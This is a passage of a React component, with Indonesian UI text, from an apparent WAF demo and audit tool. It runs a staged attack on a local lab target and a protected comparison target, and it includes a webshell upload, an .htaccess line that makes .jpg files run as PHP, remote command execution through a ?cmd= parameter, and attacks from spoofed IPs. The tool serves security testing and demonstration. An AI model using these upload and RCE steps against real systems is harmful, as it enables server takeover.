            const hit = (res.body ?? "").includes(step.expect);
            setChainRuns((prev) => ({
                ...prev,
                [step.label]: {
                    status: res.status,
                    ok:
                        res.success === true &&
                        res.status !== 403 &&
                        res.status !== 429 &&
                        hit,
                    note:
                        res.success !== true
                            ? `gagal: ${res.message ?? ""}`
                            : `HTTP ${res.status} — ${
                                  hit
                                      ? `tanda "${step.expect}" DITEMUKAN ✅`
                                      : `tanda "${step.expect}" tak ada, lanjutkan langkah berikut`
                              }`,
                },
            }));
        } finally {
            setBusy(null);
        }
    };

    /**
     * Eksekusi nyata tiap metode hacker (lab lokal): upload ulang, tanam
     * .htaccess, atau RCE — lalu tampilkan hasil + JSON-nya.
     */
    const runMethod = async (
        cardIndex: number,
        item: NoPasakRecommendation,
        mi: number,
        force = false,
    ): Promise<void> => {
        const m = VULN_INFO[item.label]?.methods[mi];
        if (!m?.exec) {
            return;
        }
        // Produksi: tindakan aktif (menanam file / RCE) wajib konfirmasi per aksi.
        if (mode === "production" && !force) {
            setPendingMethod({ cardIndex, item, mi, label: m.title });
            setConfirmMethod(true);
            return;
        }
        const key = `${cardIndex}:${mi}`;
        const exec = m.exec;
        // Buka Sheet kanan: keterangan aksi + hasil menyusul di bawahnya.
        const requestLine =
            exec.kind === "vector"
                ? `${exec.method ?? "GET"} ${exec.path}${exec.userAgent ? `  (UA: ${exec.userAgent.slice(0, 60)})` : ""}${exec.payload ? `  body: ${exec.payload.slice(0, 80)}` : ""}`
                : exec.kind === "reupload"
                  ? `POST /upload (file ${item.label})`
                  : exec.kind === "htaccess"
                    ? "POST /upload (file .htaccess)"
                    : `GET /shell/shell.php.jpg?cmd=${exec.cmd}`;

        setSheetMethod({
            title: m.title,
            desc: m.desc,
            request: requestLine,
            vuln: item.label,
        });
        setSheetRun(null);
        setSheetOpen(true);
        setBusy(`method-${key}`);

        const record = (run: MethodRun): void => {
            setMethodRuns((prev) => ({ ...prev, [key]: run }));
            setSheetRun(run);
        };

        try {
            if (exec.kind === "vector") {
                const res = await sendRaw({
                    target: url,
                    path: exec.path,
                    method: exec.method ?? "GET",
                    ip: attackerIp.trim(),
                    userAgent: exec.userAgent ?? "",
                    payload: exec.payload ?? "",
                });
                const grade = gradeVector(res, exec.path);
                record({
                    label: m.title,
                    status: res.status,
                    ok: grade !== "blocked",
                    grade,
                    output:
                        grade === "blocked"
                            ? `→ HTTP ${res.status} — DITOLAK di gerbang.`
                            : grade === "proven"
                              ? `→ HTTP ${res.status} — TERBUKTI, jejak payload ditemukan di body. Tujuan tercapai.`
                              : `→ HTTP ${res.status} — tak diblokir, tapi TANPA bukti eksploitasi (mis. 404 route tak ada). Lanjutkan rantai.`,
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            request: requestLine,
                            status: res.status,
                            grade,
                            body: (res.body ?? "").slice(0, 300),
                        },
                        null,
                        2,
                    ),
                });
            } else if (exec.kind === "reupload") {
                const res = await fire(item, cardIndex);
                record({
                    label: m.title,
                    status: res.status,
                    ok: isPassed(res),
                    grade: (res.body ?? "").includes('"ok":true')
                        ? "proven"
                        : isPassed(res)
                          ? "passed"
                          : "blocked",
                    output: `Upload ulang → HTTP ${res.status} (${isPassed(res) ? "tetap lolos" : "tertahan"}).`,
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            status: res.status,
                            body: (res.body ?? "").slice(0, 300),
                        },
                        null,
                        2,
                    ),
                });
            } else if (exec.kind === "htaccess") {
                const res = await sendRaw({
                    target: url,
                    path: "/upload",
                    method: "POST",
                    ip: attackerIp.trim(),
                    upload: {
                        field: "file",
                        filename: ".htaccess",
                        content_type: "text/plain",
                        content: "AddType application/x-httpd-php .jpg",
                    },
                });
                record({
                    label: m.title,
                    status: res.status,
                    ok:
                        res.success === true &&
                        res.status !== 403 &&
                        res.status !== 429,
                    grade: (res.body ?? "").includes('"ok":true')
                        ? "proven"
                        : res.success === true &&
                            res.status !== 403 &&
                            res.status !== 429
                          ? "passed"
                          : "blocked",
                    output: `Upload .htaccess → HTTP ${res.status}. Kini shell.php.jpg dieksekusi sebagai PHP.`,
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            status: res.status,
                            body: (res.body ?? "").slice(0, 300),
                        },
                        null,
                        2,
                    ),
                });
            } else if (exec.kind === "rce") {
                if (mode === "local" && !fileCheck?.ok) {
                    record({
                        label: m.title,
                        ok: false,
                        grade: "blocked",
                        output: "Verifikasi file dulu (tombol 🔍) agar RCE bisa dijalankan.",
                        json: JSON.stringify(
                            { metode: m.title, hasil: "butuh verifikasi file" },
                            null,
                            2,
                        ),
                    });
                    return;
                }
                const done = await exploitShellWith(cardIndex, exec.cmd);
                record({
                    label: m.title,
                    status: done.status,
                    ok: done.ok,
                    grade: done.ok ? "proven" : "blocked",
                    output: `$ ${exec.cmd}\n${done.output.slice(0, 500)}`,
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            cmd: exec.cmd,
                            output: done.output.slice(0, 500),
                        },
                        null,
                        2,
                    ),
                });
            }
        } finally {
            setBusy(null);
        }
    };

    /** Salin JSON hasil pengujian ke clipboard. */
    const copyJson = async (index: number, text: string): Promise<void> => {
        try {
            await navigator.clipboard.writeText(text);
        } catch {
            const area = document.createElement("textarea");
            area.value = text;
            document.body.appendChild(area);
            area.select();
            document.execCommand("copy");
            document.body.removeChild(area);
        }
        setCopiedIdx(index);
        setTimeout(
            () => setCopiedIdx((prev) => (prev === index ? null : prev)),
            1500,
        );
    };

    const total = noPasakRecommendations.length;
    const done = Object.keys(results).length;
    const passedCount = Object.values(results).filter(isPassed).length;
    const allPassed = passedCount === total && done >= total;
    const pct = Math.round((passedCount / total) * 100);

    const activeStageEntry = noPasakStages.find(
        (stage) => stage.id === activeStage,
    );
    const stage4UploadEntry = itemsOf(4).find(
        ({ item }) => item.label === "Upload shell.php.jpg",
    );
    const stage4UploadIdx = stage4UploadEntry?.index;
    const showAttackerCard =
        activeStage === 4 &&
        stage4UploadIdx !== undefined &&
        isPassed(results[stage4UploadIdx]) &&
        fileCheck?.ok;

    return (
        <TooltipProvider>
            <div className="grid items-start gap-4 xl:grid-cols-[minmax(0,1fr)_minmax(0,26rem)]">
                <div className="flex min-w-0 flex-col gap-4">
                    {/* Top Configuration & Stepper Card */}
                    <Card>
                        <CardHeader>
                            <CardTitle>
                                ⚠️ Tanpa Pasak = Jebol — audit 4 tahap
                            </CardTitle>
                            <CardDescription>
                                Ikuti tahap 1→4 berurutan. Tiap tahap terkunci
                                sampai tahap sebelumnya <b>semua LOLOS</b>{" "}
                                (tidak 403).
                                {mode === "production" ? (
                                    <>
                                        {" "}
                                        Target produksi{" "}
                                        <b>{url || "(isi URL dulu)"}</b> — semua
                                        tahap boleh dijalankan.{" "}
                                        <b>Upaya upload</b> diizinkan sebagai
                                        bukti pemblokiran (adil: 403 =
                                        terlindungi, lolos = temuan). Yang
                                        dimatikan hanya{" "}
                                        <b>eksekusi perintah (/shell)</b> — itu
                                        RCE sungguhan, khusus lab lokal.
                                    </>
                                ) : (
                                    <>
                                        {" "}
                                        Di tahap 4 Anda menanam webshell
                                        sungguhan lalu{" "}
                                        <b>
                                            memverifikasi file-nya bisa dibuka
                                            publik
                                        </b>{" "}
                                        — bukti tak terbantahkan. Target:
                                        pasak-no di{" "}
                                        <code>http://localhost:8000</code>.
                                    </>
                                )}
                            </CardDescription>
                        </CardHeader>
                        <CardContent className="flex flex-col gap-3">
                            <div className="grid gap-3 md:grid-cols-2">
                                <div className="flex flex-col gap-1">
                                    <Label htmlFor="nopasak-target">
                                        URL target
                                    </Label>
                                    <Input
                                        id="nopasak-target"
                                        type="url"
                                        value={url}
                                        placeholder="http://localhost:8000"
                                        onChange={(e) =>
                                            onTargetChange?.(e.target.value)
                                        }
                                        className="font-mono"
                                    />
                                </div>
                                <div className="flex flex-col gap-1">
                                    <Label htmlFor="nopasak-ip">
                                        🎭 IP penyerang (simulasi)
                                    </Label>
                                    <div className="flex gap-2">
                                        <Input
                                            id="nopasak-ip"
                                            type="text"
                                            value={attackerIp}
                                            placeholder="kosong = acak tiap kirim"
                                            onChange={(e) =>
                                                setAttackerIp(e.target.value)
                                            }
                                            className="min-w-0 flex-1 font-mono"
                                        />
                                        <Tooltip>
                                            <TooltipTrigger
                                                render={
                                                    <Button
                                                        type="button"
                                                        variant="outline"
                                                        size="icon"
                                                        onClick={() =>
                                                            setAttackerIp(
                                                                randomPublicIp(),
                                                            )
                                                        }
                                                    >
                                                        <DicesIcon data-icon="inline-start" />
                                                    </Button>
                                                }
                                            />
                                            <TooltipContent>
                                                Buat IP acak baru
                                            </TooltipContent>
                                        </Tooltip>
                                        {attackerIp.trim() !== "" && (
                                            <Tooltip>
                                                <TooltipTrigger
                                                    render={
                                                        <Button
                                                            type="button"
                                                            variant="outline"
                                                            size="icon"
                                                            onClick={() =>
                                                                setAttackerIp(
                                                                    "",
                                                                )
                                                            }
                                                        >
                                                            <XIcon data-icon="inline-start" />
                                                        </Button>
                                                    }
                                                />
                                                <TooltipContent>
                                                    Kembali ke acak tiap kirim
                                                </TooltipContent>
                                            </Tooltip>
                                        )}
                                    </div>
                                    <span className="text-xs font-normal text-muted-foreground">
                                        {attackerIp.trim() === ""
                                            ? "Mode botnet: setiap kiriman memakai IP publik acak."
                                            : `Mode tetap: semua serangan dikirim sebagai ${attackerIp.trim()} (bagus untuk demo auto-block / IP tercatat di Monitor).`}
                                    </span>
                                </div>
                            </div>

                            <Separator />

                            {/* Stepper tahapan */}
                            <ol className="flex flex-wrap gap-2">
                                {noPasakStages.map((stage) => {
                                    const passed = stagePassed(stage.id);
                                    const open = unlocked(stage.id);
                                    const noted =
                                        waived[stage.id] !== undefined;
                                    return (
                                        <li key={stage.id}>
                                            <Button
                                                type="button"
                                                size="sm"
                                                disabled={!open}
                                                variant={
                                                    activeStage === stage.id
                                                        ? "default"
                                                        : passed
                                                          ? "secondary"
                                                          : "outline"
                                                }
                                                onClick={() =>
                                                    setActiveStage(stage.id)
                                                }
                                                className={cn(
                                                    "rounded-full font-bold",
                                                    !open && "opacity-50",
                                                )}
                                                title={
                                                    noted
                                                        ? `Catatan: ${waived[stage.id]}`
                                                        : undefined
                                                }
                                            >
                                                {passed ? (
                                                    <CheckIcon data-icon="inline-start" />
                                                ) : noted ? (
                                                    "⚠️"
                                                ) : open ? null : (
                                                    <LockIcon data-icon="inline-start" />
                                                )}
                                                {!passed && !noted && open
                                                    ? `${stage.id}. `
                                                    : ""}
                                                {stage.title.replace(
                                                    `Tahap ${stage.id} — `,
                                                    "",
                                                )}
                                            </Button>
                                        </li>
                                    );
                                })}
                            </ol>

                            {done > 0 && (
                                <Card size="sm">
                                    <CardContent className="flex flex-col gap-2">
                                        <p className="text-sm font-bold">
                                            📊 {passedCount}/{total} lolos (
                                            {pct}%)
                                            {allPassed &&
                                                (mode === "production" ||
                                                    fileCheck?.ok) &&
                                                (mode === "production"
                                                    ? " — TERBUKTI: PRODUKSI TAK MENOLAK SERANGAN ✅"
                                                    : " — TERBUKTI 100% JEBOL + WEBSHELL AKTIF ✅")}
                                            {allPassed &&
                                                mode === "local" &&
                                                !fileCheck?.ok &&
                                                " — semua lolos, verifikasi file tahap 4 untuk vonis final."}
                                        </p>
                                        <Progress value={pct}>
                                            <ProgressLabel className="sr-only">
                                                Progres lolos
                                            </ProgressLabel>
                                            <ProgressValue>
                                                {() => `${pct}%`}
                                            </ProgressValue>
                                        </Progress>
                                        {busy !== null && (
                                            <Skeleton className="h-2 w-full" />
                                        )}
                                        {allPassed &&
                                            (mode === "production" ||
                                                fileCheck?.ok) && (
                                                <Alert variant="destructive">
                                                    <TriangleAlertIcon data-icon="inline-start" />
                                                    <AlertTitle>
                                                        {mode === "production"
                                                            ? "Vonis produksi: TAK ADA PENOLAKAN — pasang Pasak sekarang"
                                                            : "Saran (terbukti bekerja):"}
                                                    </AlertTitle>
                                                    <AlertDescription>
                                                        <ol className="ml-4 list-decimal">
                                                            <li>
                                                                Simpan bukti:
                                                                screenshot vonis
                                                                ini + ekspor
                                                                History sebagai
                                                                laporan
                                                                baseline.
                                                            </li>
                                                            {mode ===
                                                            "production" ? (
                                                                <>
                                                                    <li>
                                                                        Server
                                                                        produksi
                                                                        tidak
                                                                        menolak
                                                                        satu pun
                                                                        dari{" "}
                                                                        {total}{" "}
                                                                        serangan
                                                                        — tidak
                                                                        ada WAF
                                                                        di
                                                                        gerbang.
                                                                    </li>
                                                                    <li>
                                                                        Uji
                                                                        banding:
                                                                        pasang
                                                                        Pasak di
                                                                        staging,
                                                                        ulangi 4
                                                                        tahap —
                                                                        target
                                                                        semua
                                                                        403.
                                                                    </li>
                                                                    <li>
                                                                        Demo RCE
                                                                        penuh
                                                                        (kartu
                                                                        penyerang)
                                                                        hanya di
                                                                        lab
                                                                        lokal{" "}
                                                                        <code>
                                                                            :8000
                                                                        </code>{" "}
                                                                        dengan
                                                                        vektor
                                                                        identik.
                                                                    </li>
                                                                </>
                                                            ) : (
                                                                <>
                                                                    <li>
                                                                        Cek{" "}
                                                                        <code>
                                                                            {
                                                                                url
                                                                            }
                                                                            /
                                                                        </code>{" "}
                                                                        —
                                                                        serangan
                                                                        tercatat
                                                                        di
                                                                        Monitor
                                                                        = rantai
                                                                        deteksi
                                                                        berjalan.
                                                                    </li>
                                                                    <li>
                                                                        Ulangi 4
                                                                        tahap ke
                                                                        pasak-yes
                                                                        (
                                                                        <code>
                                                                            :8001
                                                                        </code>
                                                                        ) —
                                                                        target:
                                                                        terhenti
                                                                        di tahap
                                                                        2 (semua
                                                                        403).
                                                                    </li>
                                                                </>
                                                            )}
                                                            {Object.entries(
                                                                waived,
                                                            ).map(
                                                                ([
                                                                    stageId,
                                                                    note,
                                                                ]) => (
                                                                    <li
                                                                        key={
                                                                            stageId
                                                                        }
                                                                    >
                                                                        Pengecualian
                                                                        tahap{" "}
                                                                        {
                                                                            stageId
                                                                        }
                                                                        : {note}
                                                                    </li>
                                                                ),
                                                            )}
                                                        </ol>
                                                    </AlertDescription>
                                                </Alert>
                                            )}
                                    </CardContent>
                                </Card>
                            )}
                        </CardContent>
                    </Card>

                    {/* Active Stage & Attack Items */}
                    {activeStageEntry && (
                        <section className="flex flex-col gap-4">
                            <Card>
                                <CardHeader>
                                    <CardTitle>
                                        {activeStageEntry.title}
                                    </CardTitle>
                                    <CardDescription>
                                        <b>Tujuan:</b> {activeStageEntry.goal}
                                    </CardDescription>
                                    <CardDescription>
                                        {activeStageEntry.doneHint}
                                    </CardDescription>
                                </CardHeader>
                                <CardContent className="flex flex-wrap gap-2">
                                    <Button
                                        type="button"
                                        size="sm"
                                        variant="destructive"
                                        onClick={() =>
                                            fireStage(activeStageEntry.id)
                                        }
                                        disabled={busy !== null}
                                    >
                                        {busy !== null ? (
                                            <Spinner data-icon="inline-start" />
                                        ) : (
                                            <PlayIcon data-icon="inline-start" />
                                        )}
                                        {busy !== null
                                            ? "Menyerang..."
                                            : `▶ Jalankan ${activeStageEntry.title.split("—")[0].trim()}`}
                                    </Button>

                                    {stagePassed(activeStageEntry.id) &&
                                        activeStageEntry.id < 4 && (
                                            <Button
                                                type="button"
                                                size="sm"
                                                variant="secondary"
                                                onClick={() =>
                                                    setActiveStage(
                                                        activeStageEntry.id + 1,
                                                    )
                                                }
                                            >
                                                <ShieldCheckIcon data-icon="inline-start" />
                                                Lanjut ke tahap{" "}
                                                {activeStageEntry.id + 1} →
                                            </Button>
                                        )}

                                    {!stagePassed(activeStageEntry.id) &&
                                        activeStageEntry.id < 4 &&
                                        itemsOf(activeStageEntry.id).some(
                                            ({ index }) =>
                                                results[index] !== undefined,
                                        ) &&
                                        waived[activeStageEntry.id] ===
                                            undefined &&
                                        (waiverOpen ? (
                                            <span className="flex flex-wrap items-center gap-2">
                                                <Input
                                                    value={waiverNote}
                                                    onChange={(e) =>
                                                        setWaiverNote(
                                                            e.target.value,
                                                        )
                                                    }
                                                    placeholder="Catatan: mis. /.env 403 dari Nginx, bukan WAF"
                                                    className="min-w-52 flex-1"
                                                />
                                                <Button
                                                    type="button"
                                                    size="sm"
                                                    variant="secondary"
                                                    disabled={
                                                        waiverNote.trim() === ""
                                                    }
                                                    onClick={() => {
                                                        setWaived((prev) => ({
                                                            ...prev,
                                                            [activeStageEntry.id]:
                                                                waiverNote.trim(),
                                                        }));
                                                        setWaiverOpen(false);
                                                        setWaiverNote("");
                                                        setActiveStage(
                                                            activeStageEntry.id +
                                                                1,
                                                        );
                                                    }}
                                                >
                                                    Konfirmasi & lanjut →
                                                </Button>
                                            </span>
                                        ) : (
                                            <Button
                                                type="button"
                                                size="sm"
                                                variant="outline"
                                                onClick={() =>
                                                    setWaiverOpen(true)
                                                }
                                            >
                                                ⚠️ Lanjut dengan catatan
                                            </Button>
                                        ))}

                                    {waived[activeStageEntry.id] !==
                                        undefined && (
                                        <Badge variant="outline">
                                            ⚠️ Catatan:{" "}
                                            {waived[activeStageEntry.id]}
                                        </Badge>
                                    )}
                                </CardContent>
                            </Card>

                            <div className="grid gap-4 lg:grid-cols-2">
                                {itemsOf(activeStageEntry.id).map(
                                    ({ item, index: i }) => (
                                        <RecommendationCard
                                            key={item.label}
                                            item={item}
                                            index={i}
                                            res={results[i]}
                                            busy={busy}
                                            proved={Boolean(proved[i])}
                                            onToggleProved={() =>
                                                setProved((prev) => ({
                                                    ...prev,
                                                    [i]: !prev[i],
                                                }))
                                            }
                                            onFire={() => fire(item, i)}
                                            onVerifyUpload={() =>
                                                verifyUploadedFile(i)
                                            }
                                            onRunMethod={(mi) =>
                                                runMethod(i, item, mi)
                                            }
                                            methodRuns={methodRuns}
                                            copiedIdx={copiedIdx}
                                            onCopyJson={copyJson}
                                            mode={mode}
                                            url={url}
                                            fileCheck={fileCheck}
                                        />
                                    ),
                                )}

                                {showAttackerCard && (
                                    <AttackerCard
                                        uploadIdx={stage4UploadIdx}
                                        execCmd={execCmd}
                                        onExecCmdChange={setExecCmd}
                                        execResult={execResult}
                                        busy={busy}
                                        onExploitShell={exploitShell}
                                        onExploitShellWith={exploitShellWith}
                                    />
                                )}
                            </div>
                        </section>
                    )}
                </div>

                {/* Right Side: Victim Live Preview */}
                <aside className="min-w-0 xl:sticky xl:top-4">
                    <LivePreviewCard
                        previewUrl={previewUrl}
                        previewPage={previewPage}
                        previewTick={previewTick}
                        onPageChange={(page) => {
                            setPreviewPage(page);
                            setPreviewTick((n) => n + 1);
                        }}
                        onRefresh={() => setPreviewTick((n) => n + 1)}
                    />
                </aside>
            </div>

            {/* Production Execution Confirmation Dialog */}
            <AlertDialog open={confirmMethod} onOpenChange={setConfirmMethod}>
                <AlertDialogContent>
                    <AlertDialogHeader>
                        <AlertDialogTitle>
                            Eksekusi ke PRODUKSI?
                        </AlertDialogTitle>
                        <AlertDialogDescription>
                            Tindakan <b>{pendingMethod?.label ?? ""}</b> akan
                            dikirim ke server nyata <b>{url}</b> — menanam file
                            / mencoba eksekusi. Lanjutkan hanya bila temuan
                            sudah terbukti (tidak 403) dan dalam cakupan izin
                            audit.
                        </AlertDialogDescription>
                    </AlertDialogHeader>
                    <AlertDialogFooter>
                        <AlertDialogCancel>Batal</AlertDialogCancel>
                        <AlertDialogAction
                            onClick={() => {
                                if (pendingMethod !== null) {
                                    const { cardIndex, item, mi } =
                                        pendingMethod;
                                    setConfirmMethod(false);
                                    setPendingMethod(null);
                                    void runMethod(cardIndex, item, mi, true);
                                }
                            }}
                        >
                            Ya, eksekusi
                        </AlertDialogAction>
                    </AlertDialogFooter>
                </AlertDialogContent>
            </AlertDialog>

            {/* Hacker Method Execution & Escalation Chain Sheet */}
            <MethodSheet
                open={sheetOpen}
                onOpenChange={setSheetOpen}
                method={sheetMethod}
                run={sheetRun}
                chainRuns={chainRuns}
                busy={busy}
                url={url}
                copiedIdx={copiedIdx}
                onCopyJson={copyJson}
                onRunChainStep={runChainStep}
            />
        </TooltipProvider>
    );
}
